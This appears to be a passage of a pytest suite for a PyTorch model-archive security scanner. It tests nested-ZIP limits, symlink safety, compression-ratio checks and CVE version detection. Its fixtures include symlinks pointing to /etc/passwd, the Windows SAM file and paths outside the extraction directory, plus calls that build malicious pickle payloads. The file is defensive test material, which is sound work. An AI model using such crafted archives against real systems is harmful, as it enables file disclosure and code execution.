        config={
            "max_nested_zip_member_bytes": nested_zip.stat().st_size - 1,
            NESTED_SCAN_CALLBACK_CONFIG_KEY: scan_nested_member,
        }
    ).scan(str(zip_path))

    assert result.success is False
    assert nested_scan_calls == []
    size_checks = [check for check in result.checks if check.name == "Nested ZIP Size Limit"]
    assert len(size_checks) == 1
    assert size_checks[0].details["zip_entries"] == ["archive/nested.zip"]
    assert size_checks[0].details["max_member_bytes"] == nested_zip.stat().st_size - 1
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_nested_archive_size_limit" in result.metadata["scan_outcome_reasons"]


def test_pytorch_zip_scanner_enforces_nested_zip_depth_limit(tmp_path: Path) -> None:
    """Nested ZIP recursion should stop once the shared archive depth cap is reached."""
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.zip")

    nested_scan_calls: list[str] = []

    def scan_nested_member(path: str, config: dict[str, object] | None = None) -> ScanResult:
        nested_scan_calls.append(path)
        nested_result = ScanResult(scanner_name="zip")
        nested_result.finish(success=True)
        return nested_result

    result = PyTorchZipScanner(
        config={
            "max_zip_depth": 1,
            "_archive_depth": 1,
            NESTED_SCAN_CALLBACK_CONFIG_KEY: scan_nested_member,
        }
    ).scan(str(zip_path))

    assert result.success is False
    assert nested_scan_calls == []
    depth_checks = [check for check in result.checks if check.name == "Nested ZIP Depth Limit"]
    assert len(depth_checks) == 1
    assert depth_checks[0].details["zip_entries"] == ["archive/nested.zip"]
    assert depth_checks[0].details["max_depth"] == 1
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_nested_archive_depth_limit" in result.metadata["scan_outcome_reasons"]


def test_pytorch_zip_nested_inconclusive_reason_propagates_to_parent() -> None:
    parent_result = ScanResult(scanner_name="pytorch_zip")
    nested_result = ScanResult(scanner_name="pytorch_zip")
    mark_inconclusive_scan_result(nested_result, PyTorchZipScanner.ENTRY_LIMIT_INCONCLUSIVE_REASON)
    nested_result.finish(success=False)

    PyTorchZipScanner._merge_nested_zip_result(parent_result, nested_result, "archive/nested.zip")

    assert parent_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert PyTorchZipScanner.ENTRY_LIMIT_INCONCLUSIVE_REASON in parent_result.metadata["scan_outcome_reasons"]
    assert parent_result.metadata["nested_zip_scans"][0]["metadata"]["scan_outcome_reasons"] == [
        PyTorchZipScanner.ENTRY_LIMIT_INCONCLUSIVE_REASON
    ]

    scanner = PyTorchZipScanner()
    scanner.current_file_path = "parent.pt"
    scanner._validate_pytorch_structure([], parent_result)

    structure_check = next(check for check in parent_result.checks if check.name == "PyTorch Structure Validation")
    assert structure_check.message == (
        "PyTorch model is missing 'data.pkl', which is unusual for standard PyTorch models."
    )
    assert structure_check.details == {"missing_file": "data.pkl"}


def test_pytorch_zip_nested_raw_detector_failure_survives_parent_metadata_restore() -> None:
    """Nested raw-detector failures must suppress later parent clean checks."""
    parent_result = ScanResult(scanner_name="pytorch_zip")
    parent_result.add_check(
        name="JIT/Script Code Execution Detection",
        passed=True,
        message="No JIT/Script code execution risks detected",
        location="parent.pt",
    )
    nested_result = ScanResult(scanner_name="zip")
    nested_result.metadata["raw_detector_analysis_failures"] = [
        {
            "detector": "jit_script",
            "context": "parent.pt:archive/nested.zip",
            "coverage_gap": "analysis_failed",
        }
    ]
    nested_result.metadata["raw_detector_failed_detectors"] = ["jit_script"]
    mark_inconclusive_scan_result(nested_result, "raw_detector_analysis_incomplete")
    nested_result.finish(success=False)

    PyTorchZipScanner._merge_nested_zip_result(parent_result, nested_result, "archive/nested.zip")
    scanner = PyTorchZipScanner()
    scanner.add_jit_script_findings([], parent_result, model_type="pytorch", context="parent.pt")

    assert parent_result.metadata["raw_detector_failed_detectors"] == ["jit_script"]
    assert parent_result.metadata["raw_detector_analysis_failures"][0]["detector"] == "jit_script"
    assert not any(
        check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.PASSED
        for check in parent_result.checks
    )


def test_pytorch_zip_scanner_checks_timeout_between_nested_archives(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.txt", "benign")

    zip_path = tmp_path / "multiple_nested.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.writestr("archive/first.zip", nested_zip.read_bytes())
        zipf.writestr("archive/second.zip", nested_zip.read_bytes())

    nested_scan_calls: list[str] = []

    def scan_nested_member(path: str, config: dict[str, object] | None = None) -> ScanResult:
        del config
        nested_scan_calls.append(path)
        nested_result = ScanResult(scanner_name="zip")
        nested_result.finish(success=True)
        return nested_result

    scanner = PyTorchZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: scan_nested_member})

    def fail_after_first_nested_scan() -> None:
        if nested_scan_calls:
            raise TimeoutError("simulated parent deadline")

    monkeypatch.setattr(scanner, "_check_timeout", fail_after_first_nested_scan)

    result = scanner.scan(str(zip_path))

    assert len(nested_scan_calls) == 1
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_scan_timeout" in result.metadata["scan_outcome_reasons"]


def test_pytorch_zip_scanner_small_high_ratio_metadata_stays_clean(tmp_path: Path) -> None:
    """Small repetitive metadata should not fail the compression ratio check."""
    zip_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    with zipfile.ZipFile(zip_path, "a", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("metadata/repetitive.txt", "A" * 16384)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    ratio_failures = [
        check
        for check in result.checks
        if check.name == "Compression Ratio Check" and check.status == CheckStatus.FAILED
    ]
    assert ratio_failures == []
    assert not [
        issue
        for issue in result.issues
        if "compression ratio" in issue.message.lower()
        and issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    ratio_successes = [
        check
        for check in result.checks
        if check.name == "Compression Ratio Check" and check.status == CheckStatus.PASSED
    ]
    assert len(ratio_successes) == 1
    assert ratio_successes[0].details["min_uncompressed_size"] == 1024 * 1024


def test_pytorch_zip_scanner_compression_ratio_passes(tmp_path):
    """Test that scanner passes when compression ratio is within limits."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        # Random-ish data doesn't compress well
        data = pickle.dumps({"weights": list(range(1000))})
        zipf.writestr("data.pkl", data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should pass compression check - look for passed checks about compression
    ratio_checks = [c for c in result.checks if "compression" in c.name.lower()]
    assert len(ratio_checks) > 0
    assert all(c.status == CheckStatus.PASSED for c in ratio_checks)


@pytest.mark.parametrize(
    ("link_name", "target", "message_fragment", "target_class"),
    [
        ("models/link", "../../outside.bin", "resolves outside extraction directory", "external"),
        ("models/link", "..\\..\\outside.bin", "resolves outside extraction directory", "external"),
        ("models/link", "/tmp/outside-model.bin", "resolves outside extraction directory", "external"),
        ("models/link", "\\\\server\\share\\model.bin", "resolves outside extraction directory", "external"),
        ("models/link", "/etc/passwd", "points to critical system path", "critical_system_path"),
        ("models/link", "/tmp/../etc/passwd", "points to critical system path", "critical_system_path"),
        ("models/link", "/etc/../tmp/benign", "resolves outside extraction directory", "external"),
        ("models/link", "C:\\Windows\\System32\\config\\SAM", "points to critical system path", "critical_system_path"),
        ("models/link", "NUL", "reserved Windows device name", "invalid"),
        ("models/link", "safe/NUL.txt", "reserved Windows device name", "invalid"),
        ("models/link", "COM1.log", "reserved Windows device name", "invalid"),
        ("models/link", "safe/LPT\u00b2.txt", "reserved Windows device name", "invalid"),
    ],
)
def test_pytorch_zip_symlink_unsafe_targets_are_critical(
    tmp_path: Path,
    link_name: str,
    target: str,
    message_fragment: str,
    target_class: str,
) -> None:
    zip_path = tmp_path / "unsafe-link-target.pt"
    _write_pytorch_zip_with_symlink(zip_path, link_name, target)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.success is False
    symlink_checks = [
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == link_name
    ]
    assert len(symlink_checks) == 1
    assert symlink_checks[0].status == CheckStatus.FAILED
    assert symlink_checks[0].severity == IssueSeverity.CRITICAL
    expected_rule_code = "S408" if target_class == "critical_system_path" else "S406"
    assert symlink_checks[0].rule_code == expected_rule_code
    assert message_fragment in symlink_checks[0].message
    assert symlink_checks[0].details == {
        "entry": link_name,
        "target": target,
        "target_class": target_class,
    }


def test_pytorch_zip_symlink_parent_near_match_inside_archive_is_safe(tmp_path: Path) -> None:
    zip_path = tmp_path / "safe-parent-target.pt"
    _write_pytorch_zip_with_symlink(zip_path, "models/link", "safe/../target.bin")

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_checks = [
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/link"
    ]
    assert len(symlink_checks) == 1
    assert symlink_checks[0].status == CheckStatus.PASSED
    assert symlink_checks[0].details == {
        "entry": "models/link",
        "target": "safe/../target.bin",
        "target_class": "safe",
    }
    assert not any(check.rule_code in {"S406", "S408"} for check in result.checks)
    assert not any(issue.rule_code in {"S406", "S408"} for issue in result.issues)


@pytest.mark.parametrize("target", ["NULL", "COM10", "NUL-file", "safe/COM0.txt", "safe/LPT4-file"])
def test_pytorch_zip_symlink_windows_device_near_matches_are_safe(tmp_path: Path, target: str) -> None:
    zip_path = tmp_path / "safe-windows-device-near-match.pt"
    _write_pytorch_zip_with_symlink(zip_path, "models/link", target)

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/link"
    )
    assert symlink_check.status == CheckStatus.PASSED
    assert symlink_check.details == {
        "entry": "models/link",
        "target": target,
        "target_class": "safe",
    }
    assert not any(issue.rule_code in {"S406", "S408"} for issue in result.issues)


def test_pytorch_zip_symlink_parent_target_inside_archive_root_is_safe(tmp_path: Path) -> None:
    zip_path = tmp_path / "safe-parent-directory-target.pt"
    _write_pytorch_zip_with_symlink(zip_path, "models/link", "../target.bin")

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/link"
    )
    assert symlink_check.status == CheckStatus.PASSED
    assert symlink_check.details["target_class"] == "safe"
    assert not any(issue.rule_code in {"S406", "S408"} for issue in result.issues)


def test_pytorch_zip_dos_creator_does_not_treat_unix_mode_bits_as_symlink(tmp_path: Path) -> None:
    zip_path = tmp_path / "dos-creator-mode-bits.pt"
    with zipfile.ZipFile(zip_path, "w") as zip_file:
        zip_file.writestr("version", "3")
        zip_file.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        ordinary_info = zipfile.ZipInfo("models/ordinary.bin")
        ordinary_info.create_system = 0
        ordinary_info.external_attr = (stat.S_IFLNK | 0o777) << 16
        zip_file.writestr(ordinary_info, b"ordinary data")

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/ordinary.bin"
        for check in result.checks
    )
    assert not any(check.rule_code in {"S406", "S408"} for check in result.checks)
    assert not any(issue.rule_code in {"S406", "S408"} for issue in result.issues)


@pytest.mark.parametrize(("target", "reason"), [(b"", "empty"), (b"safe\x00outside", "NUL byte")])
def test_pytorch_zip_symlink_invalid_targets_are_critical(tmp_path: Path, target: bytes, reason: str) -> None:
    zip_path = tmp_path / "invalid-link-target.pt"
    _write_pytorch_zip_with_symlink(zip_path, "models/link", target)

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/link"
    )
    assert symlink_check.status == CheckStatus.FAILED
    assert symlink_check.severity == IssueSeverity.CRITICAL
    assert symlink_check.rule_code == "S406"
    assert reason in symlink_check.message
    assert symlink_check.details["target_class"] == "invalid"


def test_pytorch_zip_symlink_non_utf8_safe_target_is_classified(tmp_path: Path) -> None:
    zip_path = tmp_path / "non-utf8-safe-link-target.pt"
    _write_pytorch_zip_with_symlink(zip_path, "models/link", b"safe-\xff-target")

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/link"
    )
    assert symlink_check.status == CheckStatus.PASSED
    assert symlink_check.rule_code is None
    assert symlink_check.details["target_class"] == "safe"
    assert not any(check.rule_code in {"S406", "S408", "S902"} for check in result.checks)
    assert "pytorch_zip_symlink_target_read_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_pytorch_zip_symlink_non_utf8_external_target_is_critical(tmp_path: Path) -> None:
    zip_path = tmp_path / "non-utf8-external-link-target.pt"
    _write_pytorch_zip_with_symlink(zip_path, "models/link", b"../../outside-\xff")

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/link"
    )
    assert symlink_check.status == CheckStatus.FAILED
    assert symlink_check.severity == IssueSeverity.CRITICAL
    assert symlink_check.rule_code == "S406"
    assert symlink_check.details["target_class"] == "external"
    assert not any(check.rule_code == "S902" for check in result.checks)
    assert "pytorch_zip_symlink_target_read_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_pytorch_zip_symlink_central_sizes_cannot_hide_escaping_suffix(tmp_path: Path) -> None:
    zip_path = tmp_path / "truncated-central-size-link-target.pt"
    link_name = "models/link"
    _write_pytorch_zip_with_symlink(zip_path, link_name, "safe/../../../outside")
    _patch_zip_member_central_target_prefix(zip_path, link_name, b"safe")

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.success is False
    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == link_name
    )
    assert symlink_check.status == CheckStatus.FAILED
    assert symlink_check.severity == IssueSeverity.CRITICAL
    assert symlink_check.rule_code == "S406"
    assert symlink_check.details["target_class"] == "invalid"


def test_pytorch_zip_symlink_target_evidence_is_bounded(tmp_path: Path) -> None:
    zip_path = tmp_path / "long-link-target.pt"
    target = "../../" + ("secret/" * 300)
    _write_pytorch_zip_with_symlink(zip_path, "models/link", target)

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == "models/link"
    )
    assert symlink_check.status == CheckStatus.FAILED
    assert symlink_check.rule_code == "S406"
    assert len(str(symlink_check.details["target"])) <= 1024


def test_pytorch_zip_symlink_target_at_size_limit_is_safe(tmp_path: Path) -> None:
    zip_path = tmp_path / "maximum-size-link-target.pt"
    target = b"a" * PyTorchZipScanner.MAX_SYMLINK_TARGET_BYTES
    _write_pytorch_zip_with_symlink(zip_path, "models/link", target)

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(check for check in result.checks if check.name == "Symlink Safety Validation")
    assert symlink_check.status == CheckStatus.PASSED
    assert symlink_check.rule_code is None
    assert symlink_check.details["target_class"] == "safe"
    assert not any(check.rule_code in {"S406", "S408", "S902"} for check in result.checks)


def test_pytorch_zip_oversized_symlink_target_is_critical(tmp_path: Path) -> None:
    zip_path = tmp_path / "oversized-link-target.pt"
    target = b"../../outside/" + b"a" * PyTorchZipScanner.MAX_SYMLINK_TARGET_BYTES
    _write_pytorch_zip_with_symlink(zip_path, "models/link", target)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.success is False
    symlink_check = next(check for check in result.checks if check.name == "Symlink Safety Validation")
    assert symlink_check.status == CheckStatus.FAILED
    assert symlink_check.severity == IssueSeverity.CRITICAL
    assert symlink_check.rule_code == "S406"
    assert symlink_check.details["target_class"] == "invalid"
    assert len(str(symlink_check.details["target"])) <= 1024
    assert not any(check.rule_code == "S902" for check in result.checks)
    assert "pytorch_zip_symlink_target_read_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_pytorch_zip_symlink_metadata_does_not_skip_pickle_analysis(tmp_path: Path) -> None:
    zip_path = tmp_path / "symlink-marked-data-pickle.pt"
    with zipfile.ZipFile(zip_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3")
        data_info = zipfile.ZipInfo("archive/data.pkl")
        data_info.create_system = 3
        data_info.external_attr = (stat.S_IFLNK | 0o777) << 16
        data_info.compress_type = zipfile.ZIP_STORED
        zip_file.writestr(data_info, _malicious_proto0_system_payload())

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.success is False
    assert result.metadata["pickle_files"] == ["archive/data.pkl"]
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_filename") == "archive/data.pkl"
        and "system" in issue.message.lower()
        for issue in result.issues
    )


def test_pytorch_zip_symlink_read_error_redacts_local_header_name(tmp_path: Path) -> None:
    zip_path = tmp_path / "mismatched-symlink-name.pt"
    secret = "SUPERSECRET_TOKEN_123"
    replacement = f"password={secret}".encode()
    central_name = "l" * len(replacement)
    _write_pytorch_zip_with_symlink(zip_path, central_name, "safe-target")
    _patch_zip_member_local_name(zip_path, central_name, replacement)

    result = PyTorchZipScanner().scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == central_name
    )
    assert symlink_check.status == CheckStatus.FAILED
    assert symlink_check.severity == IssueSeverity.CRITICAL
    assert symlink_check.rule_code == "S406"
    assert symlink_check.details["target_class"] == "invalid"
    assert secret not in result.to_json()


def test_pytorch_zip_symlink_rejects_excessive_compressed_input_before_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    zip_path = tmp_path / "compressed-input-symlink.pt"
    link_name = "models/link"
    _write_pytorch_zip_with_symlink(zip_path, link_name, "safe-target")
    excessive_size = PyTorchZipScanner.MAX_SYMLINK_TARGET_COMPRESSED_BYTES + 1
    _patch_zip_member_central_compressed_size(zip_path, link_name, excessive_size)
    scanner = PyTorchZipScanner()

    def fail_read(*_args: object, **_kwargs: object) -> tuple[str, bool]:
        raise AssertionError("oversized compressed symlink target must not be opened")

    monkeypatch.setattr(scanner, "_read_symlink_target", fail_read)

    result = scanner.scan(str(zip_path))

    symlink_check = next(
        check
        for check in result.checks
        if check.name == "Symlink Safety Validation" and check.details.get("entry") == link_name
    )
    assert symlink_check.status == CheckStatus.FAILED
    assert symlink_check.severity == IssueSeverity.CRITICAL
    assert symlink_check.rule_code == "S406"
    assert symlink_check.details["target_class"] == "invalid"
    assert symlink_check.details["compressed_size"] == excessive_size


def test_pytorch_zip_scanner_symlink_detection(tmp_path: Path) -> None:
    """Test that scanner detects symlinks in archives."""

    zip_path = tmp_path / "model.pt"

    # Create a ZIP file with a symlink entry
    # Symlinks in ZIP files have external_attr with S_IFLNK flag
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")

        # Create a symlink entry manually
        # The external_attr field encodes the Unix file mode
        # S_IFLNK = 0o120000 (symlink)
        symlink_info = zipfile.ZipInfo("malicious_link")
        symlink_info.create_system = 3
        # Set external attributes to indicate symlink (Unix mode in upper 16 bits)
        symlink_info.external_attr = 0o120777 << 16  # symlink with full permissions
        symlink_info.compress_type = zipfile.ZIP_STORED
        zipf.writestr(symlink_info, "/etc/passwd")

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    symlink_checks = [check for check in result.checks if check.name == "Symlink Safety Validation"]
    assert len(symlink_checks) == 1
    assert symlink_checks[0].status == CheckStatus.FAILED
    assert symlink_checks[0].severity == IssueSeverity.CRITICAL
    assert symlink_checks[0].rule_code == "S408"
    assert symlink_checks[0].details["target_class"] == "critical_system_path"


def test_pytorch_zip_scanner_no_symlinks_passes(tmp_path: Path) -> None:
    """Test that scanner passes when no symlinks are present."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        data = pickle.dumps({"weights": [1, 2, 3]})
        zipf.writestr("data.pkl", data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should pass symlink check - look for passed checks about symlinks
    symlink_checks = [c for c in result.checks if "symlink" in c.name.lower()]
    assert len(symlink_checks) > 0
    assert all(c.status == CheckStatus.PASSED for c in symlink_checks)


def test_pytorch_zip_scanner_combined_security_controls(tmp_path: Path) -> None:
    """Test that multiple security controls fire together without interfering."""
    zip_path = tmp_path / "model.pt"
    symlink_target = tmp_path / "combined-target"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        # Add a symlink entry before the entry cap, then enough entries to exceed a low limit.
        symlink_info = zipfile.ZipInfo("evil_link")
        symlink_info.create_system = 3
        symlink_info.external_attr = (stat.S_IFLNK | 0o777) << 16
        symlink_info.compress_type = zipfile.ZIP_STORED
        zipf.writestr(symlink_info, str(symlink_target))
        for i in range(12):
            zipf.writestr(f"entry_{i}.txt", "data")

    scanner = PyTorchZipScanner(config={"max_archive_entries": 10})
    result = scanner.scan(str(zip_path))

    # Entry limit should trigger
    entry_issues = [
        i
        for i in result.issues
        if "entries" in i.message.lower() and ("max" in i.message.lower() or "limit" in i.message.lower())
    ]
    assert len(entry_issues) > 0
    assert entry_issues[0].severity == IssueSeverity.WARNING

    # Symlink should also trigger independently
    symlink_issues = [i for i in result.issues if "symlink" in i.message.lower()]
    assert len(symlink_issues) > 0
    assert symlink_issues[0].severity == IssueSeverity.CRITICAL


def test_pytorch_zip_version_extraction_returns_metadata_when_present(monkeypatch: pytest.MonkeyPatch) -> None:
    """The raw extractor should preserve metadata when both sources are present."""
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.5.1")

    detected_version, source = scanner._get_detected_pytorch_version(
        {"pytorch_framework_version": "2.10.0", "pytorch_version_source": "metadata:config.json:pytorch_version"}
    )

    assert detected_version == "2.10.0"
    assert source == "metadata:config.json:pytorch_version"


def test_pytorch_zip_scan_bounds_archive_version_metadata(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "oversized-version.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("archive/version", b"3" + (b" " * 8))
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))

    monkeypatch.setattr(PyTorchZipScanner, "MAX_VERSION_METADATA_BYTES", 8)
    result = PyTorchZipScanner().scan(str(model_path))

    limit_check = next(check for check in result.checks if check.name == "PyTorch Version Metadata Limit")
    assert result.metadata["pytorch_archive_version"] is None
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert PyTorchZipScanner.VERSION_METADATA_LIMIT_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
    assert limit_check.details["zip_entry"] == "archive/version"
    assert limit_check.details["file_size"] == 9
    assert limit_check.details["max_read_bytes"] == 8


def test_pytorch_zip_scan_accepts_archive_version_at_metadata_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "bounded-version.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("archive/version", b"3" + (b" " * 7))
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))

    monkeypatch.setattr(PyTorchZipScanner, "MAX_VERSION_METADATA_BYTES", 8)
    result = PyTorchZipScanner().scan(str(model_path))

    assert result.metadata["pytorch_archive_version"] == "3"
    assert PyTorchZipScanner.VERSION_METADATA_LIMIT_INCONCLUSIVE_REASON not in result.metadata.get(
        "scan_outcome_reasons", []
    )
    assert not [check for check in result.checks if check.name == "PyTorch Version Metadata Limit"]


def test_pytorch_zip_version_metadata_read_failure_suppresses_fixed_version_claim(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unreadable-version.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))

    scanner = PyTorchZipScanner()
    original_read_member_bytes = scanner._read_member_bytes

    def fail_version_probe(*args: Any, **kwargs: Any) -> bytes:
        if kwargs.get("phase") == "version_probe":
            raise OSError("simulated version metadata read failure")
        return original_read_member_bytes(*args, **kwargs)

    monkeypatch.setattr(scanner, "_read_member_bytes", fail_version_probe)
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.10.0")

    result = scanner.scan(str(model_path))

    read_check = next(check for check in result.checks if check.name == "PyTorch Version Metadata Read")
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert PyTorchZipScanner.VERSION_METADATA_READ_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
    assert read_check.details["zip_entry"] == "archive/version"
    assert read_check.details["exception_type"] == "OSError"
    assert not [
        check
        for check in result.checks
        if check.name == "CVE-2026-24747 PyTorch Version Check" and check.status == CheckStatus.PASSED
    ]


def test_pytorch_zip_oversized_json_suppresses_fixed_version_claim(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "oversized-version-json.pt"
    metadata = json.dumps({"padding": "x" * 32, "pytorch_version": "2.9.0"}).encode()
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("config.json", metadata)

    monkeypatch.setattr(PyTorchZipScanner, "MAX_VERSION_JSON_BYTES", len(metadata) - 1)
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.10.0")

    result = scanner.scan(str(model_path))

    assert PyTorchZipScanner.VERSION_METADATA_LIMIT_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
    assert not [
        check
        for check in result.checks
        if check.name == "CVE-2026-24747 PyTorch Version Check" and check.status == CheckStatus.PASSED
    ]


def test_pytorch_zip_oversized_json_preserves_vulnerable_local_version(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "oversized-version-json-vulnerable-local.pt"
    metadata = json.dumps({"padding": "x" * 32, "pytorch_version": "2.10.0"}).encode()
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("config.json", metadata)

    monkeypatch.setattr(PyTorchZipScanner, "MAX_VERSION_JSON_BYTES", len(metadata) - 1)
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.9.0")

    result = scanner.scan(str(model_path))

    failed_checks = [
        check
        for check in result.checks
        if check.name == "CVE-2026-24747 PyTorch Version Check" and check.status == CheckStatus.FAILED
    ]
    assert len(failed_checks) == 1
    assert failed_checks[0].details["detected_pytorch_version"] == "2.9.0"
    assert failed_checks[0].details["pytorch_version_source"] == "local_environment"


@pytest.mark.parametrize("invalid_probe_limit", [0, -1, False, "1024"])
def test_pytorch_zip_version_probe_rejects_invalid_overrides(invalid_probe_limit: object) -> None:
    scanner = PyTorchZipScanner(config={"version_probe_bytes": invalid_probe_limit})

    assert scanner.max_version_probe_bytes == scanner.DEFAULT_VERSION_PICKLE_PROBE_BYTES


def test_pytorch_zip_version_selection_prefers_local_vulnerable_version(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A vulnerable local runtime must override fixed artifact metadata."""
    scanner = PyTorchZipScanner()

    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.5.1")

    detected_version, source = scanner._select_pytorch_version_for_check(
        {"pytorch_framework_version": "2.10.0", "pytorch_version_source": "metadata:config.json:pytorch_version"},
        scanner._is_vulnerable_pytorch_version,
    )

    assert detected_version == "2.5.1"
    assert source == "local_environment"


def test_pytorch_zip_version_selection_prefers_metadata_when_local_is_fixed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A fixed local runtime must not hide vulnerable artifact metadata."""
    scanner = PyTorchZipScanner()

    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.10.0")

    detected_version, source = scanner._select_pytorch_version_for_check(
        {"pytorch_framework_version": "2.9.0", "pytorch_version_source": "metadata:config.json:pytorch_version"},
        scanner._is_vulnerable_pytorch_version_2026,
    )

    assert detected_version == "2.9.0"
    assert source == "metadata:config.json:pytorch_version"


def test_pytorch_zip_version_selection_uses_metadata_when_torch_unavailable(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Metadata fallback should still work when local torch isn't importable."""
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: None)

    detected_version, source = scanner._select_pytorch_version_for_check(
        {"pytorch_framework_version": "2.5.1", "pytorch_version_source": "metadata:config.json:pytorch_version"},
        scanner._is_vulnerable_pytorch_version,
    )

    assert detected_version == "2.5.1"
    assert source == "metadata:config.json:pytorch_version"


